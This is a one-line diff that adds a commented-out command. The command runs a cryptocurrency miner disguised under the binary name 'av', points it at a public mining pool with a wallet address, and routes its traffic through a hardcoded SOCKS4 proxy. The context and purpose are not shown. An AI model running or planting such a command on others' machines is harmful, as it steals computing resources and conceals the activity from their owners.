@@ -1,0 +1,1 @@
+#./av -a yespower -o stratum+tcp://yespower.na.mine.zpool.ca:6234 -u DLBQG2WuuNfm334qpEKuj5RV3VQRWRm3FW -p SRB -t12 -q -x socks4://176.37.46.163:5678
